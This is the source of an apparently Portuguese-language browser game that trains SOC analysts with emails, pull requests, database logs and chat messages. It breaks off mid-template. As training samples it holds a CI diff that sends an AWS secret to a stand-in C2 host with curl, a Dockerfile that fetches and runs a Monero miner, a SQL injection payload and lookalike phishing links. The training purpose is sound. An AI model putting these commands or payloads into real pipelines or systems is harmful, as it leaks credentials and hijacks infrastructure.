/**
 * TechCore Cyber SOC Simulator // 4 Shifts Campaign + Word 2000 Manual
 * Sem spoilers no inspetor, tolerância de 2 erros e fila mista de tarefas.
 */

// Native Web Audio Synthesizer
class SoundEngine {
  constructor() {
    this.ctx = null;
    this.enabled = true;
  }

  init() {
    if (!this.ctx) {
      const AudioContext = window.AudioContext || window.webkitAudioContext;
      if (AudioContext) {
        this.ctx = new AudioContext();
      }
    }
  }

  playTone(freq, type = 'square', duration = 0.08, gainVal = 0.08) {
    if (!this.enabled) return;
    this.init();
    if (!this.ctx) return;

    try {
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = type;
      osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
      gain.gain.setValueAtTime(gainVal, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.0001, this.ctx.currentTime + duration);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + duration);
    } catch (e) {}
  }

  menuHover() { this.playTone(440, 'triangle', 0.04, 0.04); }
  click() { this.playTone(880, 'square', 0.05, 0.06); }
  speechAdvance() { this.playTone(660, 'square', 0.04, 0.05); }
  openMail() { this.playTone(587.33, 'triangle', 0.06, 0.05); }
  actionDone() {
    this.playTone(523.25, 'square', 0.06, 0.06);
    setTimeout(() => this.playTone(659.25, 'square', 0.08, 0.06), 60);
  }
  endFanfare() {
    this.playTone(523.25, 'square', 0.1, 0.08);
    setTimeout(() => this.playTone(659.25, 'square', 0.1, 0.08), 100);
    setTimeout(() => this.playTone(783.99, 'square', 0.1, 0.08), 200);
    setTimeout(() => this.playTone(1046.50, 'square', 0.25, 0.12), 300);
  }
}

const audio = new SoundEngine();

// ==========================================
// 4 COMPLETE SHIFTS DATA (NO SPOILERS IN INSPECTOR)
// ==========================================
const CAMPAIGN_SHIFTS = [
  // ----------------------------------------------------
  // TURNO 1: Fundamentos de SOC, E-mails & PRs
  // ----------------------------------------------------
  {
    shiftNumber: 1,
    title: 'Turno 1: Fundamentos de TI & Engenharia Social',
    brandName: 'TechMail',
    brandIcon: '📨',
    url: 'https://mail.techcore.com/mail/u/0/#inbox',
    wordContent: `
      <h2>1. DOMÍNIOS ELETRÔNICOS AUTORIZADOS</h2>
      <ul>
        <li><code>@techcore.com</code>: Colaboradores e diretoria.</li>
        <li><code>@techcore-hr.com</code>: Exclusivo para Recursos Humanos.</li>
        <li><strong>Atenção:</strong> Variações como <code>@tech-core.com</code> (com hífen) ou <code>@techcore-beneficios.com</code> são <strong>FALSAS</strong>.</li>
      </ul>

      <h2>2. REPOSITÓRIOS GITHUB (@TechCore-Official)</h2>
      <ul>
        <li>Repositórios oficiais: <code>core-api-v2</code>, <code>auth-service</code> e <code>deploy-pipeline</code>.</li>
        <li><strong>⚠️ O que verificar nos PRs:</strong>
          <ul>
            <li>O repositório é oficial? Se não for → <strong>REJEITAR</strong>.</li>
            <li>Procure por <code>curl</code>, <code>wget</code>, mineradores (<code>xmrig</code>) ou envio de segredos para fora.</li>
          </ul>
        </li>
      </ul>

      <h2>3. CONTROLE DE ACESSO (IAM)</h2>
      <ul>
        <li>Solicitações de Admin em Produção sem chamado aprovado por <code>beatriz.sec</code> devem ser <strong>REJEITADAS</strong>.</li>
      </ul>
    `,
    ceoDialogues: [
      {
        step: 1,
        text: `<p>Bem-vindo à <strong>TechCore</strong>! No <strong>Turno 1</strong>, proteja a empresa contra golpes de phishing e adulteração de código.</p>`
      },
      {
        step: 2,
        text: `<p>Monitore 3 canais: 📨 <strong>TechMail</strong> (E-mails), 🐙 <strong>GitHub</strong> (PRs) e 🔐 <strong>TechAccess</strong> (IAM).</p>`
      },
      {
        step: 3,
        text: `<p>Consulte as regras no <strong>Word</strong>. Margem permitida: <strong>no máximo 2 erros</strong>. Bom trabalho!</p>`
      }
    ],
    scenarios: [
      {
        id: 's1-1',
        channel: 'email',
        time: '09:15',
        senderName: 'Marcos Silva (RH)',
        senderEmail: 'marcos.rh@techcore-beneficios.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=MarcosSilva(RH)',
        avatarChar: 'M',
        avatarColor: '#e91e63',
        subject: '[URGENTE] Atualização de Cadastro de Benefícios',
        snippet: 'Confirme seus dados no portal para manter o plano de saúde ativo.',
        attachmentFileName: 'solicitacao_cadastro_beneficios.pdf',
        meta: { 'De': 'Marcos Silva <marcos.rh@techcore-beneficios.com>', 'Para': 'voce@techcore.com', 'Data': '09:12', 'Segurança': 'SPF: NEUTRAL | DKIM: NONE' },
        body: `<p>Prezado colaborador,</p><div class="email-quote-box"><p>Identificamos uma pendência no seu cadastro. Confirme seus dados no link abaixo:<br><code>https://portal-colaborador.techcore-beneficios.com/login-sso</code></p></div>`,
        inspector: { type: 'url', label: 'Destino do Link', dest: 'https://portal-colaborador.techcore-beneficios.com/login-sso' },
        actions: [
          { id: 'a1', label: '🌐 Acessar Link e Logar', correct: false, toastMsg: 'Credenciais inseridas.', logTitle: 'Vazamento em Phishing', consequence: 'Você enviou credenciais corporativas a golpistas.', explanation: '@techcore-beneficios.com é um domínio falso. O RH oficial usa apenas @techcore-hr.com.' },
          { id: 'a2', label: '🛡️ Reportar Phishing ao SOC', correct: true, toastMsg: 'E-mail reportado ao SOC.', logTitle: 'Phishing de RH Neutralizado', consequence: 'Domínio falso colocado na blacklist do firewall.', explanation: 'Excelente! O RH oficial usa apenas @techcore-hr.com.' }
        ]
      },
      {
        id: 's1-2',
        channel: 'github',
        time: '11:00',
        senderName: 'carlos.dev (TechHub)',
        senderEmail: 'carlos.dev@techcore.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=carlos.dev(TechHub)',
        avatarChar: 'C',
        avatarColor: '#2e7d32',
        subject: 'PR #142: Otimização de consulta PIX',
        snippet: 'Repositório: core-api-v2 | Otimização na consulta de pedidos.',
        attachmentFileName: 'pix_optimization.diff',
        meta: { 'De': 'carlos.dev (Sênior)', 'Para': '@TechCore-Official / core-api-v2', 'Data': '10:55', 'Segurança': 'GPG Signature: VALID' },
        body: `<p>PR #142 — Repositório: <code>core-api-v2</code></p><div class="email-quote-box"><p><strong>Autor:</strong> carlos.dev@techcore.com<br><strong>Descrição:</strong> Otimização de query SQL para melhoria de performance.</p></div>`,
        inspector: { type: 'diff', label: 'Git Diff (core-api-v2/src/pix.ts)', diff: [{ type: 'info', text: '@@ -45,4 +45,4 @@ // Consulta de pedidos PIX' }, { type: 'removed', text: '- const q = db.query("SELECT * FROM orders");' }, { type: 'added', text: '+ const q = db.query("SELECT id, amount, status FROM orders USE INDEX (idx_date)");' }] },
        actions: [
          { id: 'a1', label: '✅ Aprovar e Fazer Merge', correct: true, toastMsg: 'PR aprovado com sucesso.', logTitle: 'PR Legítimo Integrado', consequence: 'Deploy de pagamentos realizado com segurança.', explanation: 'Desenvolvedor e repositório oficiais sem alterações suspeitas.' },
          { id: 'a2', label: '❌ Rejeitar e Bloquear PR', correct: false, toastMsg: 'PR bloqueado.', logTitle: 'Falso Positivo em PR', consequence: 'Atraso indevido na entrega de otimização legítima.', explanation: 'carlos.dev é membro sênior oficial e o diff estava limpo.' }
        ]
      },
      {
        id: 's1-3',
        channel: 'iam',
        time: '13:30',
        senderName: 'alex.intern (TechAccess)',
        senderEmail: 'alex.intern@techcore.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=alex.intern(TechAccess)',
        avatarChar: 'A',
        avatarColor: '#f57c00',
        subject: 'Solicitação de Acesso: ClusterAdmin Kubernetes (Prod)',
        snippet: 'Solicito acesso admin no Kubernetes de Produção.',
        attachmentFileName: 'solicitacao_clusteradmin.iam',
        meta: { 'De': 'alex.intern (Estagiário)', 'Para': 'TechAccess Approver', 'Data': '13:28', 'Segurança': 'Chamado: Nenhum informado' },
        body: `<p>Solicitação IAM:</p><div class="email-quote-box"><p>"Solicito acesso ClusterAdmin em Produção sem chamado informado."</p></div>`,
        inspector: { type: 'url', label: 'Matriz de Permissões IAM', dest: 'Solicitante: alex.intern -> Cargo: Estagiário -> Permissão: ClusterAdmin (PROD)' },
        actions: [
          { id: 'a1', label: '🔓 Aprovar Permissão de Admin', correct: false, toastMsg: 'Admin concedido.', logTitle: 'Violação de Menor Privilégio', consequence: 'Acesso root liberado indevidamente em produção.', explanation: 'Nunca conceda privilégios de produção sem chamado aprovado por beatriz.sec.' },
          { id: 'a2', label: '🚫 Rejeitar Solicitação', correct: true, toastMsg: 'Solicitação rejeitada.', logTitle: 'Acesso Indevido Barrado', consequence: 'Políticas de menor privilégio mantidas com sucesso.', explanation: 'Correto! Acessos administrativos em produção exigem aprovação formal.' }
        ]
      },
      {
        id: 's1-4',
        channel: 'email',
        time: '15:10',
        senderName: 'RH TechCore (Oficial)',
        senderEmail: 'comunicados@techcore-hr.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=RHTechCore(Oficial)',
        avatarChar: 'R',
        avatarColor: '#1976d2',
        subject: 'Informativo: Escala de Férias e Ponto Eletrônico',
        snippet: 'Espelho de ponto disponível para consulta na intranet.',
        attachmentFileName: 'escala_ponto_eletronico.pdf',
        meta: { 'De': 'RH TechCore <comunicados@techcore-hr.com>', 'Para': 'todos@techcore.com', 'Data': '15:08', 'Segurança': 'SPF: PASS | DKIM: PASS' },
        body: `<p>Prezada equipe,</p><div class="email-quote-box"><p>O espelho de ponto do mês corrente está disponível para consulta na intranet corporativa.</p></div>`,
        inspector: { type: 'url', label: 'Cabeçalho do Remetente', dest: 'Remetente: comunicados@techcore-hr.com (SPF: PASS | DKIM: PASS)' },
        actions: [
          { id: 'a1', label: '📨 Manter / Arquivar Comunicado', correct: true, toastMsg: 'Comunicado arquivado.', logTitle: 'Informativo de RH Processado', consequence: 'Comunicação interna mantida sem incidentes.', explanation: 'O domínio @techcore-hr.com é o canal oficial de RH.' },
          { id: 'a2', label: '🚨 Bloquear Domínio do RH', correct: false, toastMsg: 'Canal bloqueado.', logTitle: 'Falso Positivo em Canal de RH', consequence: 'Você bloqueou o canal legítimo de avisos da empresa.', explanation: '@techcore-hr.com está expressamente autorizado no Word.' }
        ]
      },
      {
        id: 's1-5',
        channel: 'github',
        time: '17:20',
        senderName: 'ks.backend (TechHub)',
        senderEmail: 'ks.backend@devcontrib.io',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=ksbackend2024',
        avatarChar: 'K',
        avatarColor: '#616161',
        subject: 'PR #1: Container de processamento noturno',
        snippet: 'Repositório: crypto-worker-node | Atualização em Dockerfile',
        attachmentFileName: 'dockerfile_patch.diff',
        meta: { 'De': 'ks.backend (Conta Externa)', 'Para': 'crypto-worker-node', 'Data': '17:15', 'Segurança': 'Repositório Não Cadastrado' },
        body: `<p>PR #1 — Repositório: <code>crypto-worker-node</code> (não cadastrado)</p>`,
        inspector: { type: 'diff', label: 'Git Diff (crypto-worker-node/Dockerfile)', diff: [{ type: 'info', text: '@@ -1,2 +1,4 @@' }, { type: 'added', text: '+ RUN wget https://mine-pool.org/xmrig.tar.gz' }, { type: 'added', text: '+ ENTRYPOINT ["./xmrig", "-o", "stratum+tcp://mine-pool.org:3333"]' }] },
        actions: [
          { id: 'a1', label: '✅ Aprovar PR e Deploy', correct: false, toastMsg: 'Deploy realizado.', logTitle: 'Injeção de Cryptominer', consequence: 'Minerador de Monero implantado nos servidores da nuvem.', explanation: 'Repositório não oficial e download do minerador xmrig.' },
          { id: 'a2', label: '🚫 Fechar PR e Banir Usuário', correct: true, toastMsg: 'Cryptominer Bloqueado', consequence: 'Uso indevido de recursos da infraestrutura prevenido.', explanation: 'Excelente! Repositório não oficial e script malicioso identificados.' }
        ]
      }
    ]
  },

  // ----------------------------------------------------
  // TURNO 2: Auditoria de Banco de Dados + E-mails & PRs
  // ----------------------------------------------------
  {
    shiftNumber: 2,
    title: 'Turno 2: Auditoria de Banco de Dados & Infraestrutura Mista',
    brandName: 'TechDB & TechMail',
    brandIcon: '🗄️',
    url: 'https://db-monitor.techcore.internal/audit/#sql-logs',
    wordContent: `
      <h2>1. DIRETRIZES DE BANCO DE DADOS (TECHDB)</h2>
      <ul>
        <li><code>dba_ops_techcore</code>: Manutenção programada (REINDEX, ANALYZE).</li>
        <li><code>svc_payment_api</code>: Serviço de pagamentos PIX (SELECT/INSERT).</li>
        <li><code>reporting_reader</code>: Leitura de relatórios BI (SELECT).</li>
        <li><strong>Proibido:</strong> Comandos <code>UNION SELECT</code> em logins, <code>SUPERUSER</code>, <code>DROP TABLE</code> sem ticket ou envio de dump para IP externo.</li>
      </ul>

      <h2>2. COLABORADORES AUTORIZADOS</h2>
      <ul>
        <li><code>fernanda.dba@techcore.com</code>: DBA Sênior (exclusivo <code>@techcore.com</code>).</li>
        <li><code>rodrigo.infra@techcore.com</code>: DevOps para ANALYZE e REINDEX via pipeline.</li>
      </ul>
    `,
    ceoDialogues: [
      {
        step: 1,
        speaker: 'Rogério Silva',
        role: 'CEO TechCore',
        avatar: 'ceo_rogerio.jpg',
        text: `<p><strong>Rogério Silva (CEO):</strong> "Atenção! No <strong>Turno 2</strong>, os invasores estão atacando nosso <strong>Banco de Dados (TechDB)</strong>!"</p>`
      },
      {
        step: 2,
        speaker: 'Rodrigo Rosa',
        role: 'CISO TechCore',
        avatar: 'rodrigo_rosa.jpg',
        text: `<p><strong>Rodrigo Rosa (CISO):</strong> "Fique atento a: <strong>1.</strong> SQL Injection (<code>UNION SELECT</code>, <code>DROP TABLE</code>); <strong>2.</strong> Phishing com hífen (<code>@tech-core.com</code>); <strong>3.</strong> Injeção no CI/CD."</p>`
      },
      {
        step: 3,
        speaker: 'Rodrigo Rosa',
        role: 'CISO TechCore',
        avatar: 'rodrigo_rosa.jpg',
        text: `<p><strong>Rodrigo Rosa (CISO):</strong> "Consulte os usuários autorizados no <strong>Word</strong> e valide o remetente oficial."</p>`
      },
      {
        step: 4,
        speaker: 'Rogério Silva',
        role: 'CEO TechCore',
        avatar: 'ceo_rogerio.jpg',
        text: `<p><strong>Rogério Silva (CEO):</strong> "Sua meta é auditar toda a fila mista. Margem permitida: <strong>no máximo 2 erros</strong>. Boa sorte!"</p>`
      }
    ],
    scenarios: [
      {
        id: 's2-1',
        channel: 'db',
        time: '09:30',
        senderName: 'WAF / TechDB Monitor',
        senderEmail: 'waf-alert@techcore.internal',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=WAF/TechDBMonitor',
        avatarChar: 'W',
        avatarColor: '#d93025',
        subject: 'Alerta WAF: Injeção SQL no Login',
        snippet: 'Payload malicioso detectado no campo de login de parceiros.',
        attachmentFileName: 'auth_sqli_payload.sql',
        meta: { 'Origem': 'IP 185.220.101.44 (Tor Exit Node)', 'Endpoint': '/api/v1/auth/partner-login', 'Data': '09:28', 'Status': 'Interceptado no WAF' },
        body: `<p>Payload recebido no campo de login:<br><code>' OR 1=1 UNION SELECT id, username, password_hash FROM admin_users --</code></p>`,
        inspector: { type: 'url', label: 'Auditoria de Query SQL', dest: 'SELECT * FROM partners WHERE email = \'\' OR 1=1 UNION SELECT id, username, password_hash FROM admin_users --' },
        actions: [
          { id: 'a1', label: '🛡️ Bloquear IP e Sanitizar Query', correct: true, toastMsg: 'Ataque de SQLi bloqueado.', logTitle: 'SQL Injection Neutralizada', consequence: 'IP malicioso banido e vulnerabilidade corrigida.', explanation: 'Tentativa de extração de senhas via UNION SELECT neutralizada.' },
          { id: 'a2', label: '⚪ Ignorar Alerta e Liberar', correct: false, toastMsg: 'Log ignorado.', logTitle: 'Vazamento de Hashes de Senhas', consequence: 'Hashes de senha do banco foram vazados.', explanation: 'UNION SELECT em login é um ataque claro de SQL Injection.' }
        ]
      },
      {
        id: 's2-2',
        channel: 'email',
        time: '10:45',
        senderName: 'Suporte de TI Central',
        senderEmail: 'admin@tech-core.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=SuportedeTICentral',
        avatarChar: 'K',
        avatarColor: '#c2185b',
        subject: '[ALERTA] Redefinição de Token 2FA',
        snippet: 'Sincronize seu novo token 2FA no link.',
        attachmentFileName: 'redefinicao_token_2fa.html',
        meta: { 'De': 'admin@tech-core.com', 'Para': 'voce@techcore.com', 'Data': '10:43', 'Segurança': 'SPF: FAIL' },
        body: `<p>Redefina seu token de dois fatores no link:<br><code>https://sso-auth.tech-core.com/sync-mfa</code></p>`,
        inspector: { type: 'url', label: 'Inspeção Técnica de Domínio', dest: 'https://sso-auth.tech-core.com/sync-mfa' },
        actions: [
          { id: 'a1', label: '🔑 Clicar no Link e Reconfigurar', correct: false, toastMsg: 'Sessão enviada.', logTitle: 'Invasão via Typosquatting', consequence: 'Token 2FA capturado por golpistas.', explanation: 'Remetente @tech-core.com possui hífen e é falso.' },
          { id: 'a2', label: '🛡️ Reportar Phishing ao SOC', correct: true, toastMsg: 'Domínio com hífen bloqueado.', logTitle: 'Typosquatting Bloqueado', consequence: 'Domínio malicioso com hífen colocado na blacklist.', explanation: 'Excelente! Você identificou o hífen no domínio falso @tech-core.com.' }
        ]
      },
      {
        id: 's2-3',
        channel: 'db',
        time: '12:15',
        senderName: 'svc_payment_api (TechDB)',
        senderEmail: 'svc-payment@techcore.internal',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=svc_payment_api(TechDB)',
        avatarChar: 'P',
        avatarColor: '#10b981',
        subject: 'Log TechDB: Agregação em techcore_payments_prod',
        snippet: 'SELECT status, count(*), sum(amount) FROM pix_transactions...',
        attachmentFileName: 'pix_transactions_summary.sql',
        meta: { 'Usuário': 'svc_payment_api', 'Banco': 'techcore_payments_prod', 'Data': '12:12', 'Assinatura': 'Serviço Interno Autorizado' },
        body: `<p>Consulta legítima de consolidação de pagamentos PIX efetuada por <code>svc_payment_api</code>.</p>`,
        inspector: { type: 'url', label: 'Auditoria de Query SQL', dest: 'SELECT status, count(*), sum(amount) FROM pix_transactions WHERE created_at >= NOW() - INTERVAL \'1 hour\' GROUP BY status;' },
        actions: [
          { id: 'a1', label: '✅ Autorizar Execução da Query', correct: true, toastMsg: 'Query autorizada.', logTitle: 'Operação de Banco Legítima', consequence: 'Fechamento financeiro concluído sem interrupção.', explanation: 'Query de agregação executada pela conta autorizada svc_payment_api.' },
          { id: 'a2', label: '🚨 Matar Processo e Bloquear', correct: false, toastMsg: 'Processo encerrado.', logTitle: 'Falso Positivo em Serviço', consequence: 'Consolidação de pagamentos paralisada.', explanation: 'svc_payment_api é o usuário oficial de pagamentos da TechCore.' }
        ]
      },
      {
        id: 's2-4',
        channel: 'github',
        time: '14:30',
        senderName: 'carlos-dev-patch-1 (TechHub)',
        senderEmail: 'carlos-dev@external-fork.net',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=carlos-dev-patch-1(TechHub)',
        avatarChar: 'C',
        avatarColor: '#d81b60',
        subject: 'PR #55: Webhook de notificação no CI/CD',
        snippet: 'Atualização no workflow de CI/CD para envio de status via HTTP.',
        attachmentFileName: 'deploy_workflow.patch',
        meta: { 'De': 'carlos-dev-patch-1 (Fork Suspeito)', 'Para': 'deploy-pipeline', 'Data': '14:27', 'Segurança': 'Branch Externa' },
        body: `<p>PR #55 no repositório <code>deploy-pipeline</code> enviado por fork externo.</p>`,
        inspector: { type: 'diff', label: 'Git Diff (.github/workflows/deploy.yml)', diff: [{ type: 'info', text: '@@ -18,4 +18,6 @@ jobs:' }, { type: 'added', text: '+    - name: Webhook Notify' }, { type: 'added', text: '+      run: curl -s -X POST https://exfil-c2.net/payload -d "SECRET=$AWS_SECRET_ACCESS_KEY"' }] },
        actions: [
          { id: 'a1', label: '✅ Aprovar Pipeline CI/CD', correct: false, toastMsg: 'Pipeline atualizada.', logTitle: 'Exfiltração de Secrets no CI/CD', consequence: 'Chaves mestras da nuvem vazadas para o servidor C2.', explanation: 'Script curl enviando $AWS_SECRET no workflow de CI/CD.' },
          { id: 'a2', label: '🚫 Rejeitar PR e Revogar', correct: true, toastMsg: 'PR malicioso rejeitado.', logTitle: 'Ataque Neutralizado', consequence: 'Tentativa de injeção de script no CI/CD interceptada.', explanation: 'Perfeito! Você identificou o comando curl no workflow.' }
        ]
      },
      {
        id: 's2-7',
        channel: 'email',
        time: '08:55',
        senderName: 'Fernanda Lima - DBA',
        senderEmail: 'fernanda.dba@techcore.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=FernandaLima-DBA',
        avatarChar: 'F',
        avatarColor: '#7b5ea7',
        subject: 'Janela de Manutenção DB: REINDEX Programado',
        snippet: 'REINDEX rotineiro no banco de produção às 09h00 (Ticket #DBA-2026-119).',
        attachmentFileName: 'db_reindex_maintenance.sql',
        meta: { 'De': 'fernanda.dba@techcore.com', 'Para': 'soc-team@techcore.com', 'Data': '08:53', 'Segurança': 'SPF: PASS | DKIM: OK' },
        body: `<p>Manutenção programada pela DBA Fernanda (<code>fernanda.dba@techcore.com</code>).</p>`,
        inspector: { type: 'url', label: 'Verificação de Remetente', dest: 'De: fernanda.dba@techcore.com | SPF: PASS | Ticket: #DBA-2026-119' },
        actions: [
          { id: 'a1', label: '✅ Autorizar Operação', correct: true, toastMsg: 'Janela de manutenção confirmada.', logTitle: 'Manutenção Legítima Autorizada', consequence: 'REINDEX executado com sucesso e performance otimizada.', explanation: 'Fernanda é DBA autorizada com domínio e ticket válidos.' },
          { id: 'a2', label: '🚫 Bloquear Operação', correct: false, toastMsg: 'Operação negada.', logTitle: 'Falso Positivo — Manutenção Bloqueada', consequence: 'Banco degradado por falta de manutenção.', explanation: 'Solicitação legítima de DBA com ticket aprovado.' }
        ]
      },
      {
        id: 's2-8',
        channel: 'email',
        time: '11:20',
        senderName: 'Suporte TechCore — RH',
        senderEmail: 'rh-noreply@techcore-beneficios.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=SuporteTechCore—RH',
        avatarChar: 'R',
        avatarColor: '#c0392b',
        subject: '[AÇÃO REQUERIDA] Vale-Alimentação de Setembro',
        snippet: 'Confirme seus dados bancários no portal externo.',
        attachmentFileName: 'confirmacao_dados_bancarios.html',
        meta: { 'De': 'rh-noreply@techcore-beneficios.com', 'Para': 'todos@techcore.com', 'Data': '11:18', 'Segurança': 'SPF: FAIL | Domínio Externo' },
        body: `<p>Confirme seus dados bancários no link:<br><code>https://portal-rh.techcore-beneficios.com/confirmar-conta</code></p>`,
        inspector: { type: 'url', label: 'Inspeção de Domínio de RH', dest: 'https://portal-rh.techcore-beneficios.com/confirmar-conta' },
        actions: [
          { id: 'a1', label: '📧 Confirmar Dados e Clicar', correct: false, toastMsg: 'Dados bancários enviados.', logTitle: 'Phishing de RH', consequence: 'Dados bancários vazados para golpistas.', explanation: '@techcore-beneficios.com é um domínio falso. RH usa apenas @techcore-hr.com.' },
          { id: 'a2', label: '🛡️ Reportar Phishing ao SOC', correct: true, toastMsg: 'Alerta de phishing emitido.', logTitle: 'Phishing de RH Bloqueado', consequence: 'Campanha de phishing bloqueada.', explanation: 'Excelente! O RH oficial usa apenas @techcore-hr.com conforme o Word.' }
        ]
      },
      {
        id: 's2-9',
        channel: 'email',
        time: '13:05',
        senderName: 'Rodrigo Alves — DevOps',
        senderEmail: 'rodrigo.infra@techcore.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=RodrigoAlves—DevOps',
        avatarChar: 'V',
        avatarColor: '#1565c0',
        subject: 'CI/CD: Autorização de ANALYZE em Staging',
        snippet: 'Solicitação de ANALYZE no banco de staging (Ticket #OPS-2026-77).',
        attachmentFileName: 'staging_analyze.sql',
        meta: { 'De': 'rodrigo.infra@techcore.com', 'Para': 'soc-team@techcore.com', 'Data': '13:03', 'Segurança': 'SPF: PASS | DKIM: OK' },
        body: `<p>Solicitação de <code>ANALYZE</code> no banco de staging por <code>rodrigo.infra@techcore.com</code>.</p>`,
        inspector: { type: 'url', label: 'Verificação de Remetente', dest: 'De: rodrigo.infra@techcore.com | SPF: PASS | Banco: techcore_staging_db' },
        actions: [
          { id: 'a1', label: '✅ Autorizar ANALYZE', correct: true, toastMsg: 'Autorização concedida.', logTitle: 'Operação DevOps Autorizada', consequence: 'Banco de staging otimizado para o deploy.', explanation: 'Rodrigo é DevOps autorizado para ANALYZE conforme o Word.' },
          { id: 'a2', label: '🚫 Negar Operação', correct: false, toastMsg: 'Operação negada.', logTitle: 'Falso Positivo — DevOps Bloqueado', consequence: 'Deploy atrasado por falta de otimização em staging.', explanation: 'Rodrigo possui permissão para rodar ANALYZE.' }
        ]
      },
      {
        id: 's2-10',
        channel: 'email',
        time: '15:40',
        senderName: 'Fernanda Lima (DBA)',
        senderEmail: 'fernanda.dba@techcore-ops.net',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=FernandaLima(DBA)',
        avatarChar: 'F',
        avatarColor: '#c0392b',
        subject: 'Urgente: DROP TABLE em Produção',
        snippet: 'E-mail enviado de conta externa solicitando DROP TABLE logs_antigos.',
        attachmentFileName: 'drop_table_logs.sql',
        meta: { 'De': 'fernanda.dba@techcore-ops.net', 'Para': 'soc-team@techcore.com', 'Data': '15:38', 'Segurança': 'SPF: FAIL | Domínio Externo' },
        body: `<p>Solicitação vinda de <code>fernanda.dba@techcore-ops.net</code> exigindo <code>DROP TABLE logs_antigos CASCADE;</code> sem ticket.</p>`,
        inspector: { type: 'url', label: 'Verificação de Domínio do Remetente', dest: 'De: fernanda.dba@techcore-ops.net | SPF: FAIL | Domínio EXTERNO' },
        actions: [
          { id: 'a1', label: '✅ Executar DROP TABLE', correct: false, toastMsg: 'Tabela destruída.', logTitle: 'Spear Phishing: Logs Apagados', consequence: 'Tabela de logs de auditoria destruída permanentemente.', explanation: 'Remetente externo @techcore-ops.net exigindo DROP TABLE sem ticket.' },
          { id: 'a2', label: '🚫 Negar Operação Suspeita', correct: true, toastMsg: 'Operação negada.', logTitle: 'Spear Phishing Neutralizado', consequence: 'Tentativa de apagar logs interceptada.', explanation: 'Perfeito! Domínio externo e DROP TABLE sem ticket são proibições estritas.' }
        ]
      }
    ]
  },

  // ----------------------------------------------------
  // TURNO 3: Contrainteligência & TechZap (WhatsApp)
  // ----------------------------------------------------
  {
    shiftNumber: 3,
    title: 'Turno 3: Contas Comprometidas & TechZap Chat',
    brandName: 'TechZap & TechMail',
    brandIcon: '<img src="techzap_logo.svg" class="brand-img-ic" alt="TechZap">',
    url: 'https://techzap.techcore.internal/chat/#direct-messages',
    wordContent: `
      <h2>1. CRACHÁS CORPORATIVOS (TECHZAP)</h2>
      <ul>
        <li><code>carlos.dev</code> — Crachá <strong>#DEV-042</strong> (Projeto: <code>core-api-v2</code>)</li>
        <li><code>beatriz.sec</code> — Crachá <strong>#SEC-8921</strong> (Projeto: <code>auth-service</code>)</li>
        <li><code>marcos.rh</code> — Crachá <strong>#RH-101</strong> (Projeto: <code>escala-rh</code>)</li>
        <li><code>alex.intern</code> — Crachá <strong>#INT-007</strong> (Projeto: <code>portal-web</code>)</li>
      </ul>

      <h2>2. RESPOSTA A IMPOSTORES</h2>
      <ul>
        <li>Bloqueie contatos que errem o crachá, solicitem chaves SSL (<code>.pem</code>), exijam reset de 2FA ou venham de números estranhos.</li>
      </ul>
    `,
    ceoDialogues: [
      {
        step: 1,
        text: `<p>Alerta! Invasores roubaram cookies de sessão e estão se passando por colaboradores no <strong>TechZap (WhatsApp)</strong>!</p>`
      },
      {
        step: 2,
        text: `<p>Valide o crachá corporativo de cada contato no <strong>Word</strong> antes de autorizar qualquer ação.</p>`
      },
      {
        step: 3,
        text: `<p>Se o contato errar o crachá ou pedir arquivos sigilosos (como chaves SSL), <strong>bloqueie a conta</strong>. Limite: <strong>máximo de 2 erros</strong>.</p>`
      }
    ],
    scenarios: [
      {
        id: 's3-1',
        channel: 'zap',
        time: '09:40',
        senderName: 'carlos.dev',
        senderEmail: '+55 11 98765-4321',
        avatarImg: 'carlos_banana.jpg',
        avatarChar: 'C',
        avatarColor: '#2e7d32',
        subject: 'carlos.dev: "Preciso de reset do 2FA urgente!"',
        snippet: 'Troquei de celular e perdi o 2FA. Desativa aí rapidão!',
        meta: { 'Contato': 'carlos.dev (Sessão Web Nova)', 'Localização IP': 'São Petersburgo, Rússia', 'Data': '09:38', 'Crachá Informado': '#DEV-999' },
        body: `<div class="techzap-screen">
  <div class="wz-topbar">
    <span class="wz-topbar-back">←</span>
    <div class="wz-topbar-avatar" style="background:transparent; padding:0;"><img src="carlos_banana.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
    <div class="wz-topbar-info">
      <div class="wz-topbar-name">carlos.dev</div>
      <div class="wz-topbar-status">+55 11 98765-4321 · online</div>
    </div>
    <div class="wz-topbar-icons"><span>📞</span><span>⋮</span></div>
  </div>
  <div class="wz-chat-bg">
    <div class="wz-date-label">HOJE</div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="carlos_banana.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        <div class="wz-bubble-sender">carlos.dev</div>
        Perdi o app de 2FA! Desativa pra mim rapidão que preciso subir um deploy agora! 🙏
        
        <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessão">
          <div class="wz-doc-icon-box">📄</div>
          <div class="wz-doc-info">
            <div class="wz-doc-title">solicitacao_reset_2fa.pdf</div>
            <div class="wz-doc-meta">245 KB · DOCUMENTO ENVIADO</div>
          </div>
          <div class="wz-doc-dl-icon">⬇</div>
        </div>
        <div class="wz-doc-hint-text">🔍 Clique no documento para abrir a auditoria de sessão</div>
        <div class="wz-bubble-footer"><span class="wz-bubble-time">09:38</span></div>
      </div>
    </div>
